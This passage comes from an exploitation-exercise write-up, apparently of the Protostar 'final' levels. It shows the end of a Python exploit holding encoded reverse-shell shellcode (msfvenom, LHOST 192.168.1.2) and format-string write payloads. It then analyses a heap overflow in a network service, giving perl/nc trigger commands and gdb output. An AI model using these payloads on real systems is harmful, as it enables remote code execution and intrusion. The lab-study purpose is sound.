<span class="ln"> 9</span><span class="n">target_ip</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;192.168.1.6&#34;</span>
<span class="ln">10</span><span class="n">target_port</span> <span class="o">=</span> <span class="mi">2994</span>
<span class="ln">11</span>
<span class="ln">12</span><span class="k">def</span> <span class="nf">send_data</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">out</span><span class="o">=</span><span class="sa"></span><span class="s2">&#34;&#34;</span><span class="p">):</span>
<span class="ln">13</span>  <span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">out</span><span class="p">),</span><span class="n">out</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
<span class="ln">14</span>  <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
<span class="ln">15</span>  <span class="n">msg</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="ln">16</span>  <span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
<span class="ln">17</span>
<span class="ln">18</span>
<span class="ln">19</span><span class="c1">#test data</span>
<span class="ln">20</span><span class="n">target_1</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;AAAA&#34;</span>
<span class="ln">21</span><span class="n">target_2</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;BBBB&#34;</span>
<span class="ln">22</span><span class="n">target_3</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;CCCC&#34;</span>
<span class="ln">23</span><span class="n">target_4</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;DDDD&#34;</span>
<span class="ln">24</span>
<span class="ln">25</span><span class="c1">#target address</span>
<span class="ln">26</span><span class="n">target</span> <span class="o">=</span> <span class="mh">0x804a194</span> <span class="c1">#puts()</span>
<span class="ln">27</span><span class="n">target_1</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span><span class="n">target</span><span class="o">+</span><span class="mi">0</span><span class="p">)</span>
<span class="ln">28</span><span class="n">target_2</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span><span class="n">target</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
<span class="ln">29</span><span class="n">target_3</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span><span class="n">target</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>
<span class="ln">30</span><span class="n">target_4</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span><span class="n">target</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span>
<span class="ln">31</span>
<span class="ln">32</span><span class="c1">#$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f python -e x86/shikata_ga_nai</span>
<span class="ln">33</span><span class="n">shellcode</span> <span class="o">=</span>  <span class="sa"></span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span>
<span class="ln">34</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\xba\xe7\x96\xde\xe9\xda\xce\xd9\x74\x24\xf4\x5b\x2b</span><span class="s2">&#34;</span>
<span class="ln">35</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\xc9\xb1\x12\x31\x53\x12\x83\xc3\x04\x03\xb4\x98\x3c</span><span class="s2">&#34;</span>
<span class="ln">36</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\x1c\x0b\x7e\x37\x3c\x38\xc3\xeb\xa9\xbc\x4a\xea\x9e</span><span class="s2">&#34;</span>
<span class="ln">37</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\xa6\x81\x6d\x4d\x7f\xaa\x51\xbf\xff\x83\xd4\xc6\x97</span><span class="s2">&#34;</span>
<span class="ln">38</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\xd3\x8f\x38\x65\xbc\xcd\x3a\x78\x60\x5b\xdb\xca\xfe</span><span class="s2">&#34;</span>
<span class="ln">39</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\x0b\x4d\x79\x4c\xa8\xe4\x9c\x7f\x2f\xa4\x36\xaf\x1f</span><span class="s2">&#34;</span>
<span class="ln">40</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\x3a\xae\xc7\x70\xde\x47\x76\x06\xfd\xc5\xd5\x91\xe3</span><span class="s2">&#34;</span>
<span class="ln">41</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\x59\xd2\x6c\x63</span><span class="s2">&#34;</span>
<span class="ln">42</span>
<span class="ln">43</span><span class="c1">#shellcode =  &#34;\xCC&#34;</span>
<span class="ln">44</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">127</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="ln">45</span>
<span class="ln">46</span><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">117</span><span class="p">:</span>
<span class="ln">47</span>  <span class="k">print</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;Exploit code too large&#34;</span><span class="p">)</span>
<span class="ln">48</span>  <span class="nb">exit</span>
<span class="ln">49</span>
<span class="ln">50</span><span class="c1">#test offset</span>
<span class="ln">51</span><span class="n">exploit</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;X&#34;</span> <span class="o">+</span> <span class="sa"></span><span class="s2">&#34;BBBB&#34;</span> <span class="o">+</span> <span class="sa"></span><span class="s2">&#34;</span><span class="si">%x</span><span class="s2">.&#34;</span><span class="o">*</span><span class="mi">16</span>
<span class="ln">52</span><span class="c1">#test data</span>
<span class="ln">53</span><span class="n">exploit</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;X&#34;</span> <span class="o">+</span> <span class="n">target_1</span> <span class="o">+</span> <span class="n">target_2</span> <span class="o">+</span> <span class="n">target_3</span> <span class="o">+</span> <span class="n">target_4</span> <span class="o">+</span> <span class="sa"></span><span class="s2">&#34;%49$x&#34;</span> <span class="o">+</span> <span class="sa"></span><span class="s2">&#34;%50$x&#34;</span> <span class="o">+</span> <span class="sa"></span><span class="s2">&#34;%51$x&#34;</span> <span class="o">+</span> <span class="sa"></span><span class="s2">&#34;%52$x&#34;</span>
<span class="ln">54</span><span class="c1">#exploit code - one-byte write</span>
<span class="ln">55</span><span class="n">exploit</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;X&#34;</span> <span class="o">+</span> <span class="n">target_1</span> <span class="o">+</span> <span class="n">target_2</span> <span class="o">+</span> <span class="n">target_3</span> <span class="o">+</span> <span class="n">target_4</span> <span class="o">+</span> <span class="sa"></span><span class="s2">&#34;</span><span class="si">%104x</span><span class="s2">%49$n&#34;</span> <span class="o">+</span> <span class="sa"></span><span class="s2">&#34;</span><span class="si">%130x</span><span class="s2">%50$n&#34;</span> <span class="o">+</span> <span class="sa"></span><span class="s2">&#34;</span><span class="si">%98x</span><span class="s2">%51$n&#34;</span> <span class="o">+</span> <span class="sa"></span><span class="s2">&#34;</span><span class="si">%04x</span><span class="s2">%52$n&#34;</span>
<span class="ln">56</span><span class="c1">#test data</span>
<span class="ln">57</span><span class="n">exploit</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;X&#34;</span> <span class="o">+</span> <span class="n">target_2</span> <span class="o">+</span> <span class="n">target_3</span> <span class="o">+</span> <span class="sa"></span><span class="s2">&#34;.%49$x&#34;</span> <span class="o">+</span> <span class="sa"></span><span class="s2">&#34;.%50$x&#34;</span>
<span class="ln">58</span><span class="c1">#exploit code - two-byte write</span>
<span class="ln">59</span><span class="n">exploit</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;X&#34;</span> <span class="o">+</span> <span class="n">target_1</span> <span class="o">+</span> <span class="n">target_3</span> <span class="o">+</span> <span class="sa"></span><span class="s2">&#34;</span><span class="si">%41328x</span><span class="s2">%49$n&#34;</span><span class="o">+</span><span class="sa"></span><span class="s2">&#34;</span><span class="si">%26084x</span><span class="s2">%50$n&#34;</span>
<span class="ln">60</span>
<span class="ln">61</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span> <span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span> <span class="p">)</span>
<span class="ln">62</span><span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span><span class="n">target_port</span><span class="p">))</span>
<span class="ln">63</span><span class="k">if</span> <span class="n">sock</span><span class="p">:</span>
<span class="ln">64</span>  <span class="n">msg</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="ln">65</span>  <span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
<span class="ln">66</span>
<span class="ln">67</span>  <span class="n">ret</span> <span class="o">=</span> <span class="n">send_data</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="sa"></span><span class="s2">&#34;username &#34;</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="ln">68</span>  <span class="n">ret</span> <span class="o">=</span> <span class="n">send_data</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="sa"></span><span class="s2">&#34;login &#34;</span> <span class="o">+</span> <span class="n">exploit</span> <span class="o">+</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="ln">69</span>
<span class="ln">70</span><span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>

<h1 id="final-2">Final 2</h1>

<p>For this level we have got a service listening on port 2993.</p>

<h2 id="analysis">Analysis</h2>

<p>Let&rsquo;s find out what is happening in the binary.</p>

<p><div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x0804be26 &lt;main+0&gt;:	push   %ebp
0x0804be27 &lt;main+1&gt;:	mov    %esp,%ebp
0x0804be29 &lt;main+3&gt;:	and    $0xfffffff0,%esp
0x0804be2c &lt;main+6&gt;:	sub    $0x20,%esp
0x0804be2f &lt;main+9&gt;:	movl   $0x1,0x4(%esp)
0x0804be37 &lt;main+17&gt;:	movl   $0xd,(%esp)
0x0804be3e &lt;main+24&gt;:	call   0x8048dcc &lt;signal@plt&gt;
0x0804be43 &lt;main+29&gt;:	movl   $0x0,0x8(%esp)
0x0804be4b &lt;main+37&gt;:	movl   $0x0,0x4(%esp)
0x0804be53 &lt;main+45&gt;:	movl   $0x804c2e2,(%esp)
0x0804be5a &lt;main+52&gt;:	call   0x80491d8 &lt;background_process&gt;
0x0804be5f &lt;main+57&gt;:	movl   $0xbb1,(%esp)
0x0804be66 &lt;main+64&gt;:	call   0x8049675 &lt;serve_forever&gt;
0x0804be6b &lt;main+69&gt;:	mov    %eax,0x18(%esp)
0x0804be6f &lt;main+73&gt;:	mov    0x18(%esp),%eax
0x0804be73 &lt;main+77&gt;:	mov    %eax,(%esp)
0x0804be76 &lt;main+80&gt;:	call   0x8049755 &lt;set_io&gt;
0x0804be7b &lt;main+85&gt;:	mov    0x18(%esp),%eax
0x0804be7f &lt;main+89&gt;:	mov    %eax,(%esp)
0x0804be82 &lt;main+92&gt;:	call   0x804bd47 &lt;get_requests&gt;
0x0804be87 &lt;main+97&gt;:	leave  
0x0804be88 &lt;main+98&gt;:	ret    </code></pre></div></p>

<p>The Service is waiting for incoming requests.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x0804bd47 &lt;get_requests+0&gt;:	push   %ebp
0x0804bd48 &lt;get_requests+1&gt;:	  mov    %esp,%ebp
0x0804bd4a &lt;get_requests+3&gt;:	  sub    $0x428,%esp
0x0804bd50 &lt;get_requests+9&gt;:	  movl   $0x0,-0x10(%ebp)
0x0804bd57 &lt;get_requests+16&gt;:	  cmpl   $0xfe,-0x10(%ebp)</code></pre></div>

<p>First, prepare the stack an initialize a loop variable.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x0804bd5e &lt;get_requests+23&gt;:	  jg     0x804bddb &lt;get_requests+148&gt;
0x0804bd60 &lt;get_requests+25&gt;:	  movl   $0x1,0x4(%esp)         ; pass size
0x0804bd68 &lt;get_requests+33&gt;:	  movl   $0x80,(%esp)           ; pass num = 128
0x0804bd6f &lt;get_requests+40&gt;:	  call   0x804b4ee &lt;calloc&gt;     ;
0x0804bd74 &lt;get_requests+45&gt;:	  mov    %eax,-0x14(%ebp)</code></pre></div>

<p>Next, allocate 128 bytes on the heap.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x0804bd77 &lt;get_requests+48&gt;:	  mov    -0x10(%ebp),%eax
0x0804bd7a &lt;get_requests+51&gt;:	  mov    -0x14(%ebp),%edx
0x0804bd7d &lt;get_requests+54&gt;:	  mov    %edx,-0x414(%ebp,%eax,4)
0x0804bd84 &lt;get_requests+61&gt;:	  addl   $0x1,-0x10(%ebp)</code></pre></div>

<p>This snippets takes care of the loop.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x0804bd88 &lt;get_requests+65&gt;:	  movl   $0x80,0x8(%esp)        ; pass nbyte = 128
0x0804bd90 &lt;get_requests+73&gt;:	  mov    -0x14(%ebp),%eax
0x0804bd93 &lt;get_requests+76&gt;:	  mov    %eax,0x4(%esp)         ; pass buf
0x0804bd97 &lt;get_requests+80&gt;:	  mov    0x8(%ebp),%eax         ;
0x0804bd9a &lt;get_requests+83&gt;:	  mov    %eax,(%esp)            ; pass FILE
0x0804bd9d &lt;get_requests+86&gt;:	  call   0x8048e5c &lt;read@plt&gt;</code></pre></div>

<p>Next, read 128 bytes into the allocated buffer.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x0804bda2 &lt;get_requests+91&gt;:	  cmp    $0x80,%eax
0x0804bda7 &lt;get_requests+96&gt;:	  jne    0x804bdde &lt;get_requests+151&gt;</code></pre></div>

<p>Check whether 128 bytes were read with the last command.
This is probably a break condition.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x0804bda9 &lt;get_requests+98&gt;:	  movl   $0x4,0x8(%esp)         ; size = 4
0x0804bdb1 &lt;get_requests+106&gt;:	movl   $0x804c2d1,0x4(%esp)   ; pass s2 = &#34;FSRD&#34;
0x0804bdb9 &lt;get_requests+114&gt;:	mov    -0x14(%ebp),%eax
0x0804bdbc &lt;get_requests+117&gt;:	mov    %eax,(%esp)            ; pass s1
0x0804bdbf &lt;get_requests+120&gt;:	call   0x8048fdc &lt;strncmp@plt&gt;
0x0804bdc4 &lt;get_requests+125&gt;:	test   %eax,%eax
0x0804bdc6 &lt;get_requests+127&gt;:	jne    0x804bde1 &lt;get_requests+154&gt;</code></pre></div>

<p>Compare the input against a global variable.
If the string is not found at the beginning, do a jump to the end of the loop.
This is probably a break condition.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x0804bdc8 &lt;get_requests+129&gt;:	mov    -0x14(%ebp),%eax
0x0804bdcb &lt;get_requests+132&gt;:	add    $0x4,%eax
0x0804bdce &lt;get_requests+135&gt;:	mov    %eax,(%esp)
0x0804bdd1 &lt;get_requests+138&gt;:	call   0x804bcd0 &lt;check_path&gt;
0x0804bdd6 &lt;get_requests+143&gt;:	jmp    0x804bd57 &lt;get_requests+16&gt;
0x0804bddb &lt;get_requests+148&gt;:	nop
0x0804bddc &lt;get_requests+149&gt;:	jmp    0x804bde2 &lt;get_requests+155&gt;
0x0804bdde &lt;get_requests+151&gt;:	nop
0x0804bddf &lt;get_requests+152&gt;:	jmp    0x804bde2 &lt;get_requests+155&gt;
0x0804bde1 &lt;get_requests+154&gt;:	nop
0x0804bde2 &lt;get_requests+155&gt;:	movl   $0x0,-0xc(%ebp)
0x0804bde9 &lt;get_requests+162&gt;:	jmp    0x804be1c &lt;get_requests+213&gt;</code></pre></div>

<p>Don&rsquo;t know exactly what&rsquo;s happening here.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x0804bdeb &lt;get_requests+164&gt;:	movl   $0xb,0x8(%esp)          ; pass nbyte = 11
0x0804bdf3 &lt;get_requests+172&gt;:	movl   $0x804c2d6,0x4(%esp)    ; pass buf = &#34;Process OK\n&#34;
0x0804bdfb &lt;get_requests+180&gt;:	mov    0x8(%ebp),%eax
0x0804bdfe &lt;get_requests+183&gt;:	mov    %eax,(%esp)             ; pass FILE
0x0804be01 &lt;get_requests+186&gt;:	call   0x8048dfc &lt;write@plt&gt;
0x0804be06 &lt;get_requests+191&gt;:	mov    -0xc(%ebp),%eax
0x0804be09 &lt;get_requests+194&gt;:	mov    -0x414(%ebp,%eax,4),%eax
0x0804be10 &lt;get_requests+201&gt;:	mov    %eax,(%esp)             ; pass ptr
0x0804be13 &lt;get_requests+204&gt;:	call   0x804a9c2 &lt;free&gt;
0x0804be18 &lt;get_requests+209&gt;:	addl   $0x1,-0xc(%ebp)</code></pre></div>

<p>This terminates the loop and cleans up the allocated memory.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x0804be1c &lt;get_requests+213&gt;:	mov    -0xc(%ebp),%eax
0x0804be1f &lt;get_requests+216&gt;:	cmp    -0x10(%ebp),%eax
0x0804be22 &lt;get_requests+219&gt;:	jl     0x804bdeb &lt;get_requests+164&gt;</code></pre></div>

<p>And another loop condition at the end.
Let&rsquo;s take a look at the check_path() function.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x0804bcd3 &lt;check_path+3&gt;:	  sub    $0x28,%esp
0x0804bcd6 &lt;check_path+6&gt;: 	  movl   $0x2f,0x4(%esp)          ; pass c = &#34;/&#34;
0x0804bcde &lt;check_path+14&gt;:	  mov    0x8(%ebp),%eax
0x0804bce1 &lt;check_path+17&gt;:	  mov    %eax,(%esp)              ; pass *s
0x0804bce4 &lt;check_path+20&gt;:	  call   0x8048f7c &lt;rindex@plt&gt;
0x0804bce9 &lt;check_path+25&gt;:	  mov    %eax,-0x10(%ebp)         ; ptr to last occurrence</code></pre></div>

<p>The last occurence of 0x2F is identified.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x0804bcec &lt;check_path+28&gt;:	  mov    -0x10(%ebp),%eax
0x0804bcef &lt;check_path+31&gt;:	  mov    %eax,(%esp)              ; pass *s
0x0804bcf2 &lt;check_path+34&gt;:	  call   0x8048edc &lt;strlen@plt&gt;
0x0804bcf7 &lt;check_path+39&gt;:	  mov    %eax,-0xc(%ebp)          ; no of bytes
0x0804bcfa &lt;check_path+42&gt;:	  cmpl   $0x0,-0x10(%ebp)
0x0804bcfe &lt;check_path+46&gt;:	  je     0x804bd45 &lt;check_path+117&gt;</code></pre></div>

<p>With the rindex of slash, the length of the remaining string is calculated.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x0804bd00 &lt;check_path+48&gt;:	  movl   $0x804c2cc,0x4(%esp)     ; pass needle = &#34;ROOT&#34;
0x0804bd08 &lt;check_path+56&gt;:	  mov    0x8(%ebp),%eax
0x0804bd0b &lt;check_path+59&gt;:	  mov    %eax,(%esp)              ; pass haystack
0x0804bd0e &lt;check_path+62&gt;:	  call   0x8048f4c &lt;strstr@plt&gt;
0x0804bd13 &lt;check_path+67&gt;:	  mov    %eax,-0x14(%ebp)
0x0804bd16 &lt;check_path+70&gt;:	  cmpl   $0x0,-0x14(%ebp)
0x0804bd1a &lt;check_path+74&gt;:	  je     0x804bd45 &lt;check_path+117&gt;</code></pre></div>

<p>Find the needle &ldquo;ROOT&rdquo; in the last part of the string.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x0804bd1c &lt;check_path+76&gt;:	  jmp    0x804bd22 &lt;check_path+82&gt;
0x0804bd1e &lt;check_path+78&gt;:	  subl   $0x1,-0x14(%ebp)
0x0804bd22 &lt;check_path+82&gt;:	  mov    -0x14(%ebp),%eax
0x0804bd25 &lt;check_path+85&gt;:	  movzbl (%eax),%eax
0x0804bd28 &lt;check_path+88&gt;:	  cmp    $0x2f,%al
0x0804bd2a &lt;check_path+90&gt;:	  jne    0x804bd1e &lt;check_path+78&gt;</code></pre></div>

<p>This iterates a pointer backwards from &ldquo;ROOT&rdquo; to locate the first occurence of 0x2F &ldquo;/&rdquo;.
There might be a problem with this loop, as the pointer will iterate out of the current variable into other memory on the heap.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x0804bd2c &lt;check_path+92&gt;:	  mov    -0xc(%ebp),%eax
0x0804bd2f &lt;check_path+95&gt;:	  mov    %eax,0x8(%esp)           ; pass size
0x0804bd33 &lt;check_path+99&gt;:	  mov    -0x10(%ebp),%eax
0x0804bd36 &lt;check_path+102&gt;:	mov    %eax,0x4(%esp)           ; pass src
0x0804bd3a &lt;check_path+106&gt;:	mov    -0x14(%ebp),%eax
0x0804bd3d &lt;check_path+109&gt;:	mov    %eax,(%esp)              ; pass dest
0x0804bd40 &lt;check_path+112&gt;:	call   0x8048f8c &lt;memmove@plt&gt;
0x0804bd45 &lt;check_path+117&gt;:	leave  </code></pre></div>

<p>So with the following command we can trigger the memmove() at 0x0804bd40.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">#perl -e &#39;print(&#34;FSRD/ROOT&#34;.&#34;A&#34;x64 .&#34;C&#34;x64 .&#34;\r\n&#34;)&#39; | nc 192.168.1.6 2993</code></pre></div>

<p>Also notice, that the services reads 128 bytes in a newly allocated buffer in a loop.
Only when less than 128 bytes are received, or the string &ldquo;FSRD&rdquo; is not at the beginning of the string does the service close the connection.
This means, that we can send sequential requests that will end up next to each other on the heap.
At this point the reverse search for 0x2F in check_path:88 and memmove comes in handy.</p>

<h2 id="vulnerability">Vulnerability</h2>

<p>By sending two specifically crafted requests we might be able overwrite the chunk size and prev_size for the second allocated memory chunk.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">       packet #1                  packet #2
+---+--------------------+------------------------+
|hdr|FSRDAAAA...AAAAAAAA/|hdr|FSRDROOT...AAAA/BBBB|
+---+--------------------+------------------------+
                       /|\                    \  /
                        |      memmove()       ||
                        +----------------------++</code></pre></div>

<p>The command to trigger the write looks as follows.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">#perl -e &#39;print(FSRD.Ax123 ./.FSRDROOT.Bx111 ./CCCCDDDD)&#39; | nc 192.168.1.6 2993</code></pre></div>

<p>With the above input, the service segfaults during free().
Let&rsquo;s take a look at the memory to verify the overwrite of <em>size</em> and <em>prev_size</em>.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">gdb$ x/34x 0x0804E008-8
0x804e000:      0x00000000      0x00000089      0x44525346      0x41414141
0x804e010:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e020:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e030:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e040:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e050:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e060:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e070:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e080:      0x41414141      0x2f414141
gdb$ x/34x 0x0804E090-8
0x804e088:      0x43434343      0x44444444      0x44525346      0x544f4f52
0x804e098:      0x42424242      0x42424242      0x42424242      0x42424242
0x804e0a8:      0x42424242      0x42424242      0x42424242      0x42424242
0x804e0b8:      0x42424242      0x42424242      0x42424242      0x42424242
0x804e0c8:      0x42424242      0x42424242      0x42424242      0x42424242
0x804e0d8:      0x42424242      0x42424242      0x42424242      0x42424242
0x804e0e8:      0x42424242      0x42424242      0x42424242      0x42424242
0x804e0f8:      0x42424242      0x42424242      0x42424242      0x2f424242
0x804e108:      0x43434343      0x44444444</code></pre></div>

<p>So the write succeeds.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------[regs]
  EAX: 0x42424242  EBX: 0xB7FD7FF4  ECX: 0x0804C2D6  EDX: 0x43434343  o d I t s Z a P c
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF828  ESP: 0xBFFFF7E0  EIP: 0x0804AAEF
  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------[code]
0x804aaef &lt;free+301&gt;:   mov    DWORD PTR [eax+0xc],edx
0x804aaf2 &lt;free+304&gt;:   mov    eax,DWORD PTR [ebp-0x18]
0x804aaf5 &lt;free+307&gt;:   mov    edx,DWORD PTR [ebp-0x14]
0x804aaf8 &lt;free+310&gt;:   mov    DWORD PTR [eax+0x8],edx
0x804aafb &lt;free+313&gt;:   mov    eax,DWORD PTR [ebp-0x24]
0x804aafe &lt;free+316&gt;:   add    DWORD PTR [ebp-0x30],eax
0x804ab01 &lt;free+319&gt;:   mov    eax,DWORD PTR [ebp-0x38]
0x804ab04 &lt;free+322&gt;:   add    eax,0x34
--------------------------------------------------------------------------------
0x0804aaef in free (mem=0x804e008) at final2/../common/malloc.c:3648
3648    final2/../common/malloc.c: No such file or directory.
        in final2/../common/malloc.c
gdb$ i r  
eax            0x42424242       0x42424242
edx            0x43434343       0x43434343</code></pre></div>

<p>And free() crashes as expected, because of the illegal chunk sizes.</p>

<p>So in order to exploit this vulnerability we have to put some more work into this.
Let&rsquo;s take a look at the free function to better understand what&rsquo;s happening.</p>

<h2 id="excursion-into-free">Excursion into free</h2>

<p>Let&rsquo;s step into free and see what&rsquo;s happening.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x804a9cf &lt;free+13&gt;:	cmp    DWORD PTR [ebp+0x8],0x0
0x804a9d3 &lt;free+17&gt;:	je     0x804ac27 &lt;free+613&gt;</code></pre></div>

<p>First, check for a NULL pointer and immediatly return.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x804a9d9 &lt;free+23&gt;:	mov    eax,DWORD PTR [ebp+0x8]
0x804a9dc &lt;free+26&gt;:	sub    eax,0x8
0x804a9df &lt;free+29&gt;:	mov    DWORD PTR [ebp-0x34],eax</code></pre></div>

<p>Store the start of the current chunk in a local variable.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x804aa37 &lt;free+117&gt;:	mov    eax,DWORD PTR [ebp-0x34]  ; start of chunk
0x804aa3a &lt;free+120&gt;:	mov    eax,DWORD PTR [eax+0x4]   ; size of chunk
0x804aa3d &lt;free+123&gt;:	and    eax,0x2
0x804aa40 &lt;free+126&gt;:	test   eax,eax
0x804aa42 &lt;free+128&gt;:	jne    0x804abca &lt;free+520&gt;</code></pre></div>

<p>Here the <em>IS_MMAPPED</em> flag is check.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x804aa54 &lt;free+146&gt;:	mov    eax,DWORD PTR [ebp-0x28]  ; start of next chunk
0x804aa57 &lt;free+149&gt;:	mov    eax,DWORD PTR [eax+0x4]   ; size of chunk
0x804aa5a &lt;free+152&gt;:	and    eax,0xfffffffc            ; mask out flags from size
0x804aa5d &lt;free+155&gt;:	mov    DWORD PTR [ebp-0x24],eax</code></pre></div>

<p>This piece of code stores the size of the next chunk on the stack.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x804aa60 &lt;free+158&gt;:	mov    eax,DWORD PTR [ebp-0x34]  ; start of chunk
0x804aa63 &lt;free+161&gt;:	mov    eax,DWORD PTR [eax+0x4]   ; size of chunk
0x804aa66 &lt;free+164&gt;:	and    eax,0x1
0x804aa69 &lt;free+167&gt;:	test   eax,eax
0x804aa6b &lt;free+169&gt;:	jne    0x804aaa7 &lt;free+229&gt;</code></pre></div>

<p>Next the <em>PREV_INUSE</em> is checked.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x804aaaa &lt;free+232&gt;:	mov    eax,DWORD PTR [eax+0x2c]
